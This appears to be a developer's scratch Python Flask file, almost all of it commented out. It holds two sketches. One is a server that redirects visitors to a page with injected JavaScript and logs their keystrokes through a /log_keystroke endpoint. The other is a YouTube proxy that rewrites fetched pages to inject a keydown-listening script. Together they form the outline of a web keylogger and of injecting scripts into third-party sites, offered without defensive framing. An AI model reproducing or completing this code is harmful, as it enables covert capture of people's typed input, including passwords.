# from flask import Flask, render_template, request, redirect, jsonify

# app = Flask(__name__)

# # Route to serve the main page
# @app.route('/')
# def home():
#     # Redirect to ABC URL
#     return redirect('/redirected')

# # Route for the page that captures keystrokes
# @app.route('/redirected')
# def redirected_page():
#     # Render a template with injected JavaScript
#     return render_template('capture_keystrokes.html')

# # Endpoint to receive keystrokes
# @app.route('/log_keystroke', methods=['POST'])
# def log_keystroke():
#     data = request.json
#     key = data.get('key')
#     print(f"Captured Key: {key}")  # Log keystrokes in the terminal (or save to a file/database)
#     return jsonify({"status": "success"})

# if __name__ == '__main__':
#     app.run(debug=True)


from flask import Flask, request, Response
import sys
print(sys.executable)

# import requests

# app = Flask(__name__)

# @app.route('/youtube_proxy')
# def youtube_proxy():
#     youtube_url = "https://www.youtube.com"  # Base YouTube URL
#     video_id = request.args.get('v', '')  # Video ID passed in query params
#     target_url = f"{youtube_url}/watch?v={video_id}" if video_id else youtube_url

#     # Fetch YouTube's content
#     response = requests.get(target_url)
#     if response.status_code != 200:
#         return f"Failed to fetch YouTube content. Status code: {response.status_code}", 500

#     # Inject custom JavaScript into the response
#     custom_script = """
#         <script>
#             console.log("Custom script added!");
#             document.addEventListener('keydown', function(event) {
#                 console.log('Key pressed:', event.key);
#             });
#         </script>
#     """
#     modified_content = response.text.replace("</body>", custom_script + "</body>")

#     # Return the modified response
#     return Response(modified_content, headers=dict(response.headers))

# if __name__ == '__main__':
#     app.run(debug=True)
